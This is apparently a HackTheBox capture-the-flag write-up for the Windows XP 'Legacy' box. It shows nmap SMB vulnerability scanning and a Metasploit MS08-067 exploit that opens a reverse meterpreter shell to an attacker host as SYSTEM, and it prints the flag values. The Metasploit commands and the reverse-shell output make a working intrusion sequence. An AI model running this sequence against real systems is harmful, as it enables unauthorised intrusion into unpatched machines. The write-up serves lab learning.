---
title: "HTB: Legacy"
date: 2025-11-23 10:00:00 +1000
categories: [HackTheBox, Easy]
tags: [windows, smb, cve-2008-4250, ms08-067, metasploit]
---

Windows XP box vulnerable to MS08_067 SMB exploit providing immediate SYSTEM access without privilege escalation.

## Enumeration

Scanned for SMB vulnerabilities:
```bash
sudo nmap -T5 -sS -sV --script=smb-vuln* TARGET_IP -v
```

### Results
```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows_xp
```

**Target Details:**
- OS: Windows XP Service Pack 3
- Language: English
- Selected Target: Windows XP SP3 English (NX)

Target vulnerable to **CVE-2008-4250** (MS08_067).

---

## Exploitation
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
exploit
```

### Exploitation Output
```
[*] Started reverse TCP handler on 10.10.14.6:4444
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (188998 bytes) to 10.10.10.4
[*] Meterpreter session 4 opened (10.10.14.6:4444 → 10.10.10.4:1038)
```

Got a meterpreter session as **NT AUTHORITY\SYSTEM**.

---

## Flags
```
meterpreter > shell

C:\>dir /s /b user.txt
C:\Documents and Settings\john\Desktop\user.txt

C:\>dir /s /b root.txt
C:\Documents and Settings\Administrator\Desktop\root.txt

C:\>type "C:\Documents and Settings\john\Desktop\user.txt"
e69367ae4c19b2a3

C:\>type "C:\Documents and Settings\Administrator\Desktop\root.txt"
993479b99a1e99a1
```

---

## Notable Commands

| Command | Description |
|---------|-------------|
| `--script=smb-vuln*` | Find SMB vulnerabilities |
| `exploit/windows/smb/ms08_067_netapi` | Metasploit module for CVE-2008-4250 |
| `dir /s /b filename` | Search for files recursively |
| `getuid` | Display current user privileges |

---

## Key Takeaways

- `--script=smb-vuln*` instantly identifies exploitable CVEs
- MS08_067 gives immediate SYSTEM access on unpatched Windows XP
- `dir /s /b` quickly finds flags on Windows
- No privilege escalation needed when landing as SYSTEM

---

**Box:** Legacy | **Difficulty:** Easy | **CVE:** CVE-2008-4250 | **Root Method:** Direct via SMB exploit
